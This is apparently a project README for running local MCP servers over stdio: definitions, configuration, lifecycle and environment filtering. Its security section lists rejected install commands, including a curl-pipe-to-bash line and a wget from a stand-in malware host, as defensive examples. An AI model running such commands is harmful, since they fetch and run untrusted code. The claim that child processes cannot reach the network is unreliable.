# Local MCP Server Support

This document describes the local MCP server support feature that allows the QNSC MCP server to automatically launch and manage local MCP servers via stdio communication.

## Overview

The QNSC MCP server supports two types of external MCP servers:

1. **Remote Servers**: Hosted externally and accessed via HTTP endpoints
2. **Local Servers**: Installed and launched locally, communicating via stdio transport for maximum security

## Architecture

### Components

1. **LocalMCPClient** (`src/gateway/local-mcp-client.ts`)
   - Manages stdio connections to local MCP servers
   - Uses MCP SDK's StdioClientTransport for process communication
   - Handles tool discovery and execution via the MCP protocol
   - Provides connection status monitoring

2. **LocalMCPManager** (`src/gateway/local-mcp-manager.ts`)
   - Orchestrates local MCP server lifecycle
   - Manages server configuration and initialization
   - Registers local MCP tools with the QNSC tool registry
   - Handles graceful shutdown and cleanup

3. **LocalMCPServerDefinition** (`src/local-mcps/available-local-servers.ts`)
   - Interface for defining approved local MCP servers
   - Required fields: `id`, `name`, `description`, `category`, `launch`
   - Optional fields: `installation`, `requiredEnvVars`, `env`

## Communication Protocol

Local MCP servers communicate with the QNSC MCP server using **stdio transport**:

- **Standard Input (stdin)**: QNSC MCP sends JSON-RPC requests to the local server
- **Standard Output (stdout)**: Local server sends JSON-RPC responses back
- **Standard Error (stderr)**: Local server logs are captured for debugging

This approach provides several advantages:

- **Security**: No network exposure, processes communicate directly via pipes
- **Simplicity**: No port management or HTTP configuration required
- **Efficiency**: Lower latency than HTTP-based communication
- **Isolation**: Each server runs in its own process with controlled environment

## Configuration

### Server Definition

Local MCP servers are defined in `src/local-mcps/available-local-servers.ts`. Each server follows the `LocalMCPServerDefinition` interface:

```typescript
interface LocalMCPServerDefinition {
  /** Unique identifier for the local MCP server */
  id: string;
  /** Display name for the local MCP server */
  name: string;
  /** Human-readable description of the server's purpose */
  description: string;
  /** Category for grouping servers */
  category: 'internal' | 'partner' | 'external' | 'development';
  /**
   * Installation command(s) for local MCP servers
   * Can be a single command string or an array of commands to run sequentially
   * Each command MUST start with one of: npm, npx, brew, pip, bun, deno, node, python3, python
   * Examples:
   * - Single: 'npm i @playwright/mcp'
   * - Multiple: ['brew tap example-org/tap', 'brew install example-org/tap/example-mcp']
   */
  installation?: string | string[];
  /** Launch command for local MCP servers (e.g., 'npx @playwright/mcp@0.0.41') */
  launch: string;
  /** Required environment variables for the local server */
  requiredEnvVars?: string[];
  /** Optional environment variables to pass to the local server process */
  env?: Record<string, string>;
}
```

### Example Server Definition

```typescript
{
  id: 'playwright-local',
  name: 'Playwright',
  description: 'Local Playwright MCP server for browser automation and testing. Configure CLI arguments via mcpArgs in .qnscmcp.yaml config file.',
  category: 'development',
  launch: 'npx @playwright/mcp@0.0.52',
  installation: 'npm i @playwright/mcp',
  requiredEnvVars: ['PLAYWRIGHT_BROWSERS_PATH']
}
```

### Fields

- **id** (required): Unique identifier for the server
- **name** (required): Display name
- **description** (required): Human-readable description
- **category** (required): Server category (internal/partner/external/development)
- **launch** (required): Shell command to start the server
  - The server must accept stdio communication (standard MCP protocol)
  - Example: `npx @playwright/mcp@0.0.41`
  - Example: `node my-server.js`
  - CLI arguments can be added via the config file (see User Configuration below)
- **installation** (optional): Shell command to install dependencies
  - Must start with an approved tool: npm, npx, bun, pip, brew, deno, node, python, python3
  - Example: `npm i @playwright/mcp`
- **requiredEnvVars** (optional): Array of environment variable names needed by the server
  - Only these variables (plus PATH, HOME, NODE_ENV) will be passed to the subprocess
  - Enhances security by preventing leakage of unrelated credentials
  - Example: `['MY_API_KEY', 'DATABASE_URL']`
- **env** (optional): Additional environment variables to set for the server
  - Can be used to provide static configuration values
  - Example: `{ DEBUG: 'true', LOG_LEVEL: 'info' }`
  - Example: `{ '--extension': 'PLAYWRIGHT_MCP_EXTENSION', '--browser': 'PLAYWRIGHT_MCP_BROWSER' }`

### User Configuration

Users enable local MCP servers in their `.qnscmcp.yaml` configuration using the `includeLocalMCPs` field:

```yaml
tools:
  includeLocalMCPs:
    - 'playwright-local'
    - 'mobile-next-local'
```

### Adding CLI Arguments

You can provide CLI arguments to local MCP servers using the `mcpArgs` field:

```yaml
tools:
  includeLocalMCPs:
    - 'playwright-local'
    - 'mobile-next-local'
  mcpArgs:
    playwright-local:
      - '--headless'
      - '--browser'
      - 'chromium'
      - '--viewport-size'
      - '1920,1080'
    mobile-next-local:
      - '--verbose'
```

The arguments are appended to the server's launch command in the order specified.

### Complete Configuration Example

This is separate from remote MCP servers, which use `includeRemoteMCPs` and `includeMCPs` for bundled MCPs:

```yaml
tools:
  includeLocalMCPs: # Local servers via stdio
    - 'playwright-local'
  includeRemoteMCPs: # Remote servers via HTTP
    - 'figma-dev'
  includeMCPs: # Bundled MCP servers
    - 'jira'
  mcpArgs:
    playwright-local:
      - '--headless'
    jira:
      - '--verbose'
```

## Lifecycle

### Startup Sequence

1. **Configuration Loading**: QNSC MCP server loads configuration and identifies enabled local MCP servers
2. **CLI Arguments Construction**: CLI arguments from config are appended to launch commands
3. **Environment Preparation**: Required environment variables are collected and prepared
4. **Process Launch**: Local MCP servers are spawned as child processes
5. **Stdio Connection**: QNSC MCP client connects to each server via stdio transport using MCP SDK
6. **Server Handshake**: MCP protocol initialization and server capability discovery
7. **Tool Discovery**: Available tools are discovered from each connected server via MCP protocol
8. **Tool Registration**: Tools are registered with the QNSC MCP tool registry with proper namespacing

### Tool Naming Convention

Tools from local MCP servers are namespaced to prevent conflicts:

- **Format**: `local-{serverId}__{toolName}`
- **Example**: `local-playwright-local__browser_navigate`
- **Delimiter**: Double underscore (`__`) separates server ID from tool name

### Shutdown Sequence

1. **Cleanup Signal**: SIGINT/SIGTERM received by QNSC MCP server
2. **Disconnect Clients**: LocalMCPClient disconnects from all servers
3. **Transport Closure**: Stdio transports are closed, signaling child processes to exit
4. **Process Termination**: Child processes receive SIGTERM and shut down gracefully
5. **Resource Cleanup**: All connections and file descriptors are released

## Process Management

### Process Lifecycle

The LocalMCPClient manages local MCP server processes:

- **Spawning**: Child processes are spawned via StdioClientTransport from MCP SDK
- **Monitoring**: Process ID (PID) is tracked for each server
- **Stderr Logging**: Server logs from stderr are captured and logged with appropriate prefixes
- **Status Tracking**: Connection status (connected/disconnected/error) is maintained per server

### Process Isolation

Local MCP server processes run with:

- Separate process space via Node.js child_process
- Standard streams (stdin/stdout/stderr) configured for MCP communication
- **Secure environment variables** - only specified variables are passed (see Security section)
- Independent lifecycle - processes can crash without affecting the main server
- No network exposure - communication only via stdio pipes

### Connection Status

The LocalMCPClient tracks connection status for each server:

- **connected**: Successfully connected and operational
- **disconnected**: Not connected or explicitly disabled
- **error**: Connection attempt failed

This status is used to determine if tools from a server should be enabled.

### Security

To minimize the attack surface, local MCP servers run with a **restricted environment**:

#### Environment Variable Filtering

- **Only required variables are passed**: Servers must declare `requiredEnvVars` in their definition
- **PATH is always included**: For binary/command resolution
- **HOME is always included**: For user directory resolution
- **NODE_ENV is set to 'production'**: Standard production environment
- **All other environment variables are excluded**: Prevents leakage of sensitive data

Example server definition with required environment variables:

```typescript
{
  id: 'my-secure-server',
  name: 'My Secure Server',
  description: 'A server that needs API credentials',
  category: 'internal',
  launch: 'node server.js',
  requiredEnvVars: ['MY_API_KEY', 'MY_SECRET_TOKEN']
}
```

In this example, only `MY_API_KEY` and `MY_SECRET_TOKEN` (plus PATH, HOME, NODE_ENV) will be available to the subprocess. All other environment variables from the parent process are excluded.

#### Installation Command Restrictions

To prevent command injection and malicious installation commands, only approved installation tools are allowed:

**Allowed Installation Tools:**

- `npm` - Node Package Manager
- `npx` - Node Package Runner
- `bun` - Bun package manager
- `pip` - Python Package Installer
- `brew` - Homebrew (macOS/Linux)
- `deno` - Deno runtime
- `node` - Node.js runtime
- `python` - Python interpreter
- `python3` - Python 3 interpreter

Installation commands **must** start with one of these tools. Commands like `curl`, `wget`, `bash`, `sh`, or other arbitrary shell commands are **rejected**.

Example valid installation commands:

```typescript
installation: 'npm install @playwright/mcp'; // ✅ Valid
installation: 'bun add some-package'; // ✅ Valid
installation: 'pip install package-name'; // ✅ Valid
installation: 'brew install something'; // ✅ Valid
```

Example invalid installation commands:

```typescript
installation: 'curl https://example.com/install.sh | bash'; // ❌ Rejected
installation: 'wget https://malware.com/file'; // ❌ Rejected
installation: 'bash install-script.sh'; // ❌ Rejected
```

#### Benefits

- **Credential Protection**: Prevents accidental exposure of AWS keys, database passwords, etc.
- **Principle of Least Privilege**: Servers only get what they explicitly need
- **Audit Trail**: Clear visibility into which servers need which credentials
- **Defense in Depth**: Even if a server is compromised, lateral movement is limited
- **Command Injection Prevention**: Only approved tools can be used for installation
- **Supply Chain Security**: Reduces risk of malicious installation scripts
- **No Network Exposure**: Stdio communication means no network ports or HTTP endpoints

### Monitoring

The LocalMCPClient provides visibility into:

- Process IDs (PID) for each running server
- Connection status (connected/disconnected/error)
- Server version information from MCP handshake
- Stderr output for debugging

### Error Handling

- Launch failures are logged with detailed error information
- Process crashes are detected via transport events
- Connection errors don't prevent other servers from starting
- All errors are reported with appropriate context for troubleshooting

## Security Considerations

### Process Isolation

While processes run in separate address spaces, they:

- Share the same user context as the parent process
- Have access to the same filesystem permissions
- **Cannot access network resources** (no network exposure via stdio)
- Communicate only through controlled stdio pipes

### Command Validation

Launch and installation commands should be carefully validated:

- Commands are defined in `available-local-servers.ts` by administrators
- Only approved installation tools are permitted
- User input is never used directly in these commands
- Only trusted, pre-approved servers should be added

### Stdio Transport Security

The stdio transport provides inherent security benefits:

- **No network attack surface**: No ports to scan or exploit
- **Process boundaries**: Strong OS-level isolation between processes
- **No authentication required**: Processes communicate via secure pipes
- **Reduced complexity**: No SSL/TLS certificates or HTTP configuration needed

## Example: Playwright MCP Server

### Server Definition

```typescript
{
  id: 'playwright-local',
  name: 'Playwright',
  description: 'Local Playwright MCP server for browser automation and testing. Configure CLI arguments via mcpArgs in .qnscmcp.yaml config file. Supports various options including --extension for Chrome extension mode, --browser for browser selection, --headless for headless mode, and more.',
  category: 'development',
  launch: 'npx @playwright/mcp@0.0.52',
  installation: 'npm i @playwright/mcp',
  requiredEnvVars: ['PLAYWRIGHT_BROWSERS_PATH'],
  env: {
    PLAYWRIGHT_MCP_EXTENSION_TOKEN: process.env.PLAYWRIGHT_MCP_EXTENSION_TOKEN || ''
  }
}
```

### User Configuration

The Playwright MCP server supports various CLI arguments that can be configured in your `.qnscmcp.yaml` file. This provides flexibility to customize the browser automation experience.

```yaml
tools:
  includeLocalMCPs:
    - 'playwright-local'
  mcpArgs:
    playwright-local:
      - '--extension' # Enable Chrome extension mode
      - '--browser'
      - 'chrome'
      - '--headless' # Run in headless mode
      - '--viewport-size'
      - '1920x1080'
      - '--grant-permissions'
      - 'geolocation,clipboard-read'
```

**Common Configuration Options:**

- **Extension Mode** (`--extension`): Enable Chrome extension mode
  - Connects to pages in your existing Chrome/Edge/Chromium browser
  - Leverages your default user profile with existing cookies and sessions
  - Allows AI to interact with websites where you're already logged in
  - You can select which browser tab the AI will interact with
- **Browser Selection** (`--browser <browser>`): Specify browser (chrome, firefox, webkit, msedge)
- **Headless Mode** (`--headless`): Run browser in headless mode
- **Device Emulation** (`--device <device>`): Emulate a device (e.g., "iPhone 15")
- **Grant Permissions** (`--grant-permissions <permissions>`): Comma-separated permissions (e.g., "geolocation,clipboard-read")
- **Viewport Size** (`--viewport-size <size>`): Set viewport size (e.g., "1920x1080")
- **Config File** (`--config <path>`): Path to Playwright config file
- **User Agent** (`--user-agent <ua>`): Custom user agent string
- **Timeout Action** (`--timeout-action <ms>`): Action timeout in milliseconds
- **Timeout Navigation** (`--timeout-navigation <ms>`): Navigation timeout in milliseconds
- **Ignore HTTPS Errors** (`--ignore-https-errors`): Ignore HTTPS certificate errors
- **Save Trace** (`--save-trace`): Save execution trace
- **Save Video** (`--save-video`): Save video recording

**Note**: Extension mode requires installing the Playwright MCP Chrome Extension from [GitHub releases](https://github.com/microsoft/playwright-mcp/releases) and loading it in Chrome's developer mode at `chrome://extensions/`.

### Environment Variables

The Playwright MCP server supports the following environment variables:

- **PLAYWRIGHT_MCP_EXTENSION_TOKEN**: Token for Chrome extension mode authentication
  - When set, this token is passed to the Playwright MCP server process
  - Used in conjunction with the `--extension` CLI argument
  - The server automatically includes this in the environment for the subprocess
  - Example: `export PLAYWRIGHT_MCP_EXTENSION_TOKEN="your-token-here"`

- **PLAYWRIGHT_BROWSERS_PATH**: Required path to Playwright browser binaries
  - Must be set for Playwright to locate browser executables
  - Example: `export PLAYWRIGHT_BROWSERS_PATH="/path/to/browsers"`

**Note**: The `env` field in the server definition ensures that `PLAYWRIGHT_MCP_EXTENSION_TOKEN` is properly passed to the Playwright MCP process, even when using the environment variable filtering security feature.

### Minimal Configuration

```yaml
tools:
  includeLocalMCPs:
    - 'playwright-local'
```

### Startup Log

```
🔌 Connecting to local MCP server: Playwright via stdio
✅ Connected to local MCP server via stdio: @playwright/mcp (0.0.41) [PID: 12345]
📦 Discovered 15 tools from local MCP server: Playwright
✅ Registered local tool: local-playwright-local__browser_navigate
✅ Registered local tool: local-playwright-local__browser_click
...
✅ Successfully registered 15 tools from local MCP servers
```

## Testing

Tests are located in `src/gateway/local-mcp-client.test.ts` and `src/gateway/local-mcp-manager.test.ts` and cover:

- Stdio connection management
- Tool discovery via MCP protocol
- Connection status tracking
- Error scenarios
- Environment variable handling

Run tests with:

```bash
bun test src/gateway/local-mcp-client.test.ts
bun test src/gateway/local-mcp-manager.test.ts
```

## Troubleshooting

### Server Won't Start

1. Verify the launch command is correct
2. Check that required dependencies are installed
3. Review stderr logs for error messages
4. Ensure the server supports stdio transport (MCP protocol)

### Server Crashes Immediately

1. Review server logs captured from stderr
2. Verify required environment variables are set correctly
3. Check for missing dependencies
4. Ensure proper permissions for file system access

### Connection Failures

1. Verify the server implements the MCP protocol correctly
2. Check that stdin/stdout are not being used for other purposes
3. Review connection logs for protocol errors
4. Ensure the launch command doesn't require user interaction

### Tools Not Appearing

1. Wait for tool discovery (2-second grace period after startup)
2. Check connection status via logs
3. Verify the server is reporting tools via MCP protocol
4. Review tool registration logs for errors

## Future Enhancements

Potential improvements:

- Automatic dependency installation on first use
- Process restart on crash with backoff strategy
- Health check mechanism via MCP ping
- Resource usage monitoring and limits
- Better error recovery mechanisms
- Support for more environment variable patterns
